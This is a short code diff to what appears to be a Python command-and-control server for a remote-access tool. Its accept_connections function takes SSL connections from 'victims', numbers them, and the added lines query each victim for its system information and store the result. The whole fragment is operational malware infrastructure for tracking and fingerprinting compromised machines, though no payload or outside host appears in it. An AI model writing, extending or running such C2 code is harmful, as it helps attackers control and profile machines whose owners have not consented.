@@ -70,9 +70,17 @@ def accept_connections(ss: ssl.SSLSocket, clients: dict[str, Victim]):
     """
     while True:
         conn, addr = ss.accept()
+
+        # Get victim system
+        conn.send(b"system")
+        buffer = conn.recv()
+        system = "Unknown"
+        if buffer:
+            system = buffer.decode()
+
         global next_id
         print(f"\rNew victim from {addr} => ID {next_id}")
-        clients[next_id] = Victim(next_id, conn, addr)
+        clients[next_id] = Victim(next_id, conn, addr, system)
         next_id = str(int(next_id) + 1)
         print(f"{PROMPT} > ", end="", flush=True)
 
